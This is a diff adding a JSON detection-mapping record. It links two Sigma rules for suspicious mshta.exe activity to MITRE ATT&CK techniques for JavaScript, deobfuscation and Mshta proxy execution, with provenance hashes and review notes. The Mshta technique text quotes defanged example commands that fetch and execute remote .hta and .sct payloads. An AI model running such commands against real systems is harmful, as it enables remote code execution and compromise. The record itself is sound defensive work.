@@ -1,0 +1,446 @@
+{
+  "analysis_status": "needs_review",
+  "mitre_stix_input": {
+    "active_attack_pattern_count": 697,
+    "bundle_id": "bundle--64af0946-bfeb-481d-96df-a38e2709e3db",
+    "bundle_path": "data/knowledge/Mitre/enterprise-attack.json",
+    "bundle_sha256": "bdf1ce86a4e604214c5076d37ae4dcb322678afc528df8492e6fdc1b554f5da3",
+    "collection": {
+      "created": "2018-01-17T12:56:55.080Z",
+      "modified": "2026-05-12T14:00:00.188Z",
+      "name": "Enterprise ATT&CK",
+      "stix_id": "x-mitre-collection--1f5f1533-f617-4ca8-9ab4-6a02367fa019",
+      "version": "19.1"
+    },
+    "commit": "6c3719993d0401de199203ecc3f369544d9e091c",
+    "data_type": "enterprise-attack",
+    "manifest_path": "configs/knowledge/mitre_enterprise_attack.json",
+    "manifest_sha256": "508b4f5773e790394765b891b6cf9064c7a4bda86b211d8386af7385ebd9ef53",
+    "object_count": 25843,
+    "repository": "https://github.com/mitre-attack/attack-stix-data",
+    "source_name": "MITRE ATT&CK",
+    "source_url": "https://raw.githubusercontent.com/mitre-attack/attack-stix-data/6c3719993d0401de199203ecc3f369544d9e091c/enterprise-attack/enterprise-attack-19.1.json",
+    "stix_version": "2.1",
+    "subtechnique_of_relationship_count": 477,
+    "tag": "v19.1"
+  },
+  "non_technique_attack_tags": [
+    {
+      "rule_ids": [
+        "cc7abbd0-762b-41e3-8a26-57ad50d2eea3"
+      ],
+      "tag": "attack.execution"
+    },
+    {
+      "rule_ids": [
+        "03cc0c25-389f-4bf8-b48d-11878079f1ca",
+        "cc7abbd0-762b-41e3-8a26-57ad50d2eea3"
+      ],
+      "tag": "attack.stealth"
+    }
+  ],
+  "other_rule_tags": [
+    {
+      "rule_ids": [
+        "03cc0c25-389f-4bf8-b48d-11878079f1ca"
+      ],
+      "tag": "car.2013-02-003"
+    },
+    {
+      "rule_ids": [
+        "03cc0c25-389f-4bf8-b48d-11878079f1ca"
+      ],
+      "tag": "car.2013-03-001"
+    },
+    {
+      "rule_ids": [
+        "03cc0c25-389f-4bf8-b48d-11878079f1ca"
+      ],
+      "tag": "car.2014-04-003"
+    },
+    {
+      "rule_ids": [
+        "cc7abbd0-762b-41e3-8a26-57ad50d2eea3"
+      ],
+      "tag": "cve.2020-1599"
+    }
+  ],
+  "parent_subtechnique_relationships": [
+    {
+      "parent_external_id": "T1059",
+      "parent_name": "Command and Scripting Interpreter",
+      "parent_stix_id": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
+      "provenance": {
+        "mitre_bundle_path": "data/knowledge/Mitre/enterprise-attack.json",
+        "mitre_bundle_sha256": "bdf1ce86a4e604214c5076d37ae4dcb322678afc528df8492e6fdc1b554f5da3"
+      },
+      "relationship_stix_id": "relationship--f9867ca2-18a1-4e84-ad1d-61d7c85fe4b3",
+      "relationship_type": "subtechnique-of",
+      "subtechnique_external_id": "T1059.007",
+      "subtechnique_name": "JavaScript",
+      "subtechnique_stix_id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d"
+    },
+    {
+      "parent_external_id": "T1218",
+      "parent_name": "System Binary Proxy Execution",
+      "parent_stix_id": "attack-pattern--457c7820-d331-465a-915e-42f85500ccc4",
+      "provenance": {
+        "mitre_bundle_path": "data/knowledge/Mitre/enterprise-attack.json",
+        "mitre_bundle_sha256": "bdf1ce86a4e604214c5076d37ae4dcb322678afc528df8492e6fdc1b554f5da3"
+      },
+      "relationship_stix_id": "relationship--0c29bffb-78c0-43c0-8b99-f5155bfa0432",
+      "relationship_type": "subtechnique-of",
+      "subtechnique_external_id": "T1218.005",
+      "subtechnique_name": "Mshta",
+      "subtechnique_stix_id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade"
+    }
+  ],
+  "resolved_technique_count": 3,
+  "resolved_techniques": [
+    {
+      "active": true,
+      "attack_external_reference": {
+        "description": null,
+        "external_id": "T1059.007",
+        "source_name": "mitre-attack",
+        "url": "https://attack.mitre.org/techniques/T1059/007"
+      },
+      "created": "2020-06-23T19:12:24.924Z",
+      "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
+      "evidence_assessment": "not_assessed",
+      "external_id": "T1059.007",
+      "external_references": [
+        {
+          "description": null,
+          "external_id": "T1059.007",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1059/007"
+        },
+        {
+          "description": "Apple. (2016, June 13). About Mac Scripting. Retrieved April 14, 2021.",
+          "external_id": null,
+          "source_name": "Apple About Mac Scripting 2016",
+          "url": "https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/index.html"
+        },
+        {
+          "description": "Dominic Chell. (2021, January 1). macOS Post-Exploitation Shenanigans with VSCode Extensions. Retrieved April 20, 2021.",
+          "external_id": null,
+          "source_name": "MDSec macOS JXA and VSCode",
+          "url": "https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/"
+        },
+        {
+          "description": "Microsoft. (2007, August 15). The World of JScript, JavaScript, ECMAScript …. Retrieved June 23, 2020.",
+          "external_id": null,
+          "source_name": "Microsoft JScript 2007",
+          "url": "https://docs.microsoft.com/archive/blogs/gauravseth/the-world-of-jscript-javascript-ecmascript"
+        },
+        {
+          "description": "Microsoft. (2017, January 18). Windows Script Interfaces. Retrieved June 23, 2020.",
+          "external_id": null,
+          "source_name": "Microsoft Windows Scripts",
+          "url": "https://docs.microsoft.com/scripting/winscript/windows-script-interfaces"
+        },
+        {
+          "description": "Microsoft. (2018, May 31). Translating to JScript. Retrieved June 23, 2020.",
+          "external_id": null,
+          "source_name": "JScrip May 2018",
+          "url": "https://docs.microsoft.com/windows/win32/com/translating-to-jscript"
+        },
+        {
+          "description": "OpenJS Foundation. (n.d.). Node.js. Retrieved June 23, 2020.",
+          "external_id": null,
+          "source_name": "NodeJS",
+          "url": "https://nodejs.org/"
+        },
+        {
+          "description": "Phil Stokes. (2019, December 5). macOS Red Team: Calling Apple APIs Without Building Binaries. Retrieved July 17, 2020.",
+          "external_id": null,
+          "source_name": "SentinelOne macOS Red Team",
+          "url": "https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/"
+        },
+        {
+          "description": "Pitt, L. (2020, August 6). Persistent JXA. Retrieved April 14, 2021.",
+          "external_id": null,
+          "source_name": "SpecterOps JXA 2020",
+          "url": "https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5"
+        },
+        {
+          "description": "Tony Lambert. (2021, February 18). Clipping Silver Sparrow’s wings: Outing macOS malware before it takes flight. Retrieved April 20, 2021.",
+          "external_id": null,
+          "source_name": "Red Canary Silver Sparrow Feb2021",
+          "url": "https://redcanary.com/blog/clipping-silver-sparrows-wings/"
+        }
+      ],
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "execution"
+        }
+      ],
+      "modified": "2026-05-12T15:12:00.620Z",
+      "name": "JavaScript",
+      "resolution_status": "resolved",
+      "revoked": false,
+      "stix_id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
+      "x_mitre_deprecated": false,
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_is_subtechnique": true,
+      "x_mitre_version": "2.2"
+    },
+    {
+      "active": true,
+      "attack_external_reference": {
+        "description": null,
+        "external_id": "T1140",
+        "source_name": "mitre-attack",
+        "url": "https://attack.mitre.org/techniques/T1140"
+      },
+      "created": "2017-12-14T16:46:06.044Z",
+      "description": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> or <code>type</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)(Citation: Sentinel One Tainted Love 2023)\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.(Citation: Volexity PowerDuke November 2016)",
+      "evidence_assessment": "not_assessed",
+      "external_id": "T1140",
+      "external_references": [
+        {
+          "description": null,
+          "external_id": "T1140",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1140"
+        },
+        {
+          "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.",
+          "external_id": null,
+          "source_name": "Volexity PowerDuke November 2016",
+          "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+        },
+        {
+          "description": "Aleksandar Milenkoski, Juan Andres Guerrero-Saade, and Joey Chen. (2023, March 23). Operation Tainted Love | Chinese APTs Target Telcos in New Attacks. Retrieved March 18, 2025.",
+          "external_id": null,
+          "source_name": "Sentinel One Tainted Love 2023",
+          "url": "https://www.sentinelone.com/labs/operation-tainted-love-chinese-apts-target-telcos-in-new-attacks/"
+        },
+        {
+          "description": "Malwarebytes Labs. (2017, March 27). New targeted attack against Saudi Arabia Government. Retrieved July 3, 2017.",
+          "external_id": null,
+          "source_name": "Malwarebytes Targeted Attack against Saudi Arabia",
+          "url": "https://blog.malwarebytes.com/cybercrime/social-engineering-cybercrime/2017/03/new-targeted-attack-saudi-arabia-government/"
+        },
+        {
+          "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.",
+          "external_id": null,
+          "source_name": "Carbon Black Obfuscation Sept 2016",
+          "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/"
+        }
+      ],
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "stealth"
+        }
+      ],
+      "modified": "2026-05-12T15:12:00.628Z",
+      "name": "Deobfuscate/Decode Files or Information",
+      "resolution_status": "resolved",
+      "revoked": false,
+      "stix_id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
+      "x_mitre_deprecated": false,
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_is_subtechnique": false,
+      "x_mitre_version": "2.0"
+    },
+    {
+      "active": true,
+      "attack_external_reference": {
+        "description": null,
+        "external_id": "T1218.005",
+        "source_name": "mitre-attack",
+        "url": "https://attack.mitre.org/techniques/T1218/005"
+      },
+      "created": "2020-01-23T19:32:49.557Z",
+      "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
+      "evidence_assessment": "not_assessed",
+      "external_id": "T1218.005",
+      "external_references": [
+        {
+          "description": null,
+          "external_id": "T1218.005",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1218/005"
+        },
+        {
+          "description": "Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.",
+          "external_id": null,
+          "source_name": "FireEye Attacks Leveraging HTA",
+          "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html"
+        },
+        {
+          "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
+          "external_id": null,
+          "source_name": "FireEye FIN7 April 2017",
+          "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html"
+        },
+        {
+          "description": "Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",
+          "external_id": null,
+          "source_name": "Airbus Security Kovter Analysis",
+          "url": "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/"
+        },
+        {
+          "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021.",
+          "external_id": null,
+          "source_name": "Cylance Dust Storm",
+          "url": "https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf"
+        },
+        {
+          "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.",
+          "external_id": null,
+          "source_name": "LOLBAS Mshta",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+        },
+        {
+          "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.",
+          "external_id": null,
+          "source_name": "Red Canary HTA Abuse Part Deux",
+          "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/"
+        },
+        {
+          "description": "Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.",
+          "external_id": null,
+          "source_name": "MSDN HTML Applications",
+          "url": "https://msdn.microsoft.com/library/ms536471.aspx"
+        },
+        {
+          "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",
+          "external_id": null,
+          "source_name": "Wikipedia HTML Application",
+          "url": "https://en.wikipedia.org/wiki/HTML_Application"
+        }
+      ],
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "stealth"
+        }
+      ],
+      "modified": "2026-05-12T15:12:00.676Z",
+      "name": "Mshta",
+      "resolution_status": "resolved",
+      "revoked": false,
+      "stix_id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
+      "x_mitre_deprecated": false,
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_is_subtechnique": true,
+      "x_mitre_version": "3.0"
+    }
+  ],
+  "review_notes": [
+    "Resolved means that an exact Sigma tag was mapped to active ATT&CK metadata; it does not confirm that the evidence demonstrates the technique.",
+    "Every rule-technique link is a candidate with evidence_assessment set to not_assessed.",
+    "Technique applicability and evidence confirmation belong to the later reviewed ground-truth milestone."
+  ],
+  "rule_count": 2,
+  "rule_technique_candidate_links": [
+    {
+      "evidence_assessment": "not_assessed",
+      "link_id": "mitre-link--68d7d7b1056595949a77691f26629d8d35558d8b0ff9a1986ad6da49dba44099",
+      "normalized_external_id": "T1218.005",
+      "provenance": {
+        "rule_sha256": "8a32fc6f6030da48f4e22446d7446ffb85b7801158ec204e4659a657ecc44380",
+        "rule_source_path": "data/knowledge/sigma/selected/powershell/proc_creation_win_mshta_susp_child_processes.yml",
+        "sigma_input_path": "outputs/evidence/mshta-powershell/sigma_match_review.json",
+        "sigma_input_schema_version": "sigma-match-review/v1",
+        "sigma_input_sha256": "cafb455ce6ad59cc5cf5f62805a0d7354f6b88d69fc1414c6f860222fd147fe4"
+      },
+      "rule_id": "03cc0c25-389f-4bf8-b48d-11878079f1ca",
+      "rule_title": "Suspicious MSHTA Child Process",
+      "sigma_tag": "attack.t1218.005",
+      "status": "candidate",
+      "technique_stix_id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade"
+    },
+    {
+      "evidence_assessment": "not_assessed",
+      "link_id": "mitre-link--79ecded5b37404842e2d64833a791b7f898fe4130e4c63545033a8c0584954b7",
+      "normalized_external_id": "T1059.007",
+      "provenance": {
+        "rule_sha256": "67d76c24526db9dadbacb2086115a62b5f6364a39a0d8197de96d6fb738b9774",
+        "rule_source_path": "data/knowledge/sigma/selected/powershell/proc_creation_win_mshta_susp_execution.yml",
+        "sigma_input_path": "outputs/evidence/mshta-powershell/sigma_match_review.json",
+        "sigma_input_schema_version": "sigma-match-review/v1",
+        "sigma_input_sha256": "cafb455ce6ad59cc5cf5f62805a0d7354f6b88d69fc1414c6f860222fd147fe4"
+      },
+      "rule_id": "cc7abbd0-762b-41e3-8a26-57ad50d2eea3",
+      "rule_title": "MSHTA Execution with Suspicious File Extensions",
+      "sigma_tag": "attack.t1059.007",
+      "status": "candidate",
+      "technique_stix_id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d"
+    },
+    {
+      "evidence_assessment": "not_assessed",
+      "link_id": "mitre-link--3ebc922d772ecfd907695057de741d7e074099ffc054e59d96db75df6ff3659c",
+      "normalized_external_id": "T1140",
+      "provenance": {
+        "rule_sha256": "67d76c24526db9dadbacb2086115a62b5f6364a39a0d8197de96d6fb738b9774",
+        "rule_source_path": "data/knowledge/sigma/selected/powershell/proc_creation_win_mshta_susp_execution.yml",
+        "sigma_input_path": "outputs/evidence/mshta-powershell/sigma_match_review.json",
+        "sigma_input_schema_version": "sigma-match-review/v1",
+        "sigma_input_sha256": "cafb455ce6ad59cc5cf5f62805a0d7354f6b88d69fc1414c6f860222fd147fe4"
+      },
+      "rule_id": "cc7abbd0-762b-41e3-8a26-57ad50d2eea3",
+      "rule_title": "MSHTA Execution with Suspicious File Extensions",
+      "sigma_tag": "attack.t1140",
+      "status": "candidate",
+      "technique_stix_id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c"
+    },
+    {
+      "evidence_assessment": "not_assessed",
+      "link_id": "mitre-link--26f2dd18e075b390ef8c3f6c138a03c14faa7a97260a8505630d03aa0d899cb2",
+      "normalized_external_id": "T1218.005",
+      "provenance": {
+        "rule_sha256": "67d76c24526db9dadbacb2086115a62b5f6364a39a0d8197de96d6fb738b9774",
+        "rule_source_path": "data/knowledge/sigma/selected/powershell/proc_creation_win_mshta_susp_execution.yml",
+        "sigma_input_path": "outputs/evidence/mshta-powershell/sigma_match_review.json",
+        "sigma_input_schema_version": "sigma-match-review/v1",
+        "sigma_input_sha256": "cafb455ce6ad59cc5cf5f62805a0d7354f6b88d69fc1414c6f860222fd147fe4"
+      },
+      "rule_id": "cc7abbd0-762b-41e3-8a26-57ad50d2eea3",
+      "rule_title": "MSHTA Execution with Suspicious File Extensions",
+      "sigma_tag": "attack.t1218.005",
+      "status": "candidate",
+      "technique_stix_id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade"
+    }
+  ],
+  "scenario_id": "mshta-powershell",
+  "schema_version": "mitre-resolution/v1",
+  "sigma_input": {
+    "analysis_status": "needs_review",
+    "canonical_input": {
+      "event_count": 1127,
+      "path": "outputs/canonical/mordor-selected-v2/files/cmd_mshta_vbscript_execute_psh_2020_10_2202580804--25aa24b5f631/canonical_events.jsonl",
+      "schema_version": "canonical-event/v2",
+      "sha256": "9bcac98d41746eb4365cb96efbc7411c595760c9f5c54678453219e71d4411d8",
+      "source_files": [
+        "cmd_mshta_vbscript_execute_psh_2020-10-2202580804.json"
+      ]
+    },
+    "evidence_input": {
+      "behavior_count": 2,
+      "observation_count": 4,
+      "path": "outputs/evidence/mshta-powershell/scenario_evidence.json",
+      "schema_version": "scenario-evidence/v1",
+      "sha256": "ea56d0bb07547da85a98339491af55d5b984d96ab8558eef3f8ec530955a4905"
+    },
+    "path": "outputs/evidence/mshta-powershell/sigma_match_review.json",
+    "rule_count": 2,
+    "schema_version": "sigma-match-review/v1",
+    "sha256": "cafb455ce6ad59cc5cf5f62805a0d7354f6b88d69fc1414c6f860222fd147fe4"
+  },
+  "technique_tag_count": 3,
+  "technique_tag_occurrence_count": 4,
+  "unresolved_technique_tags": [],
+  "warnings": []
+}
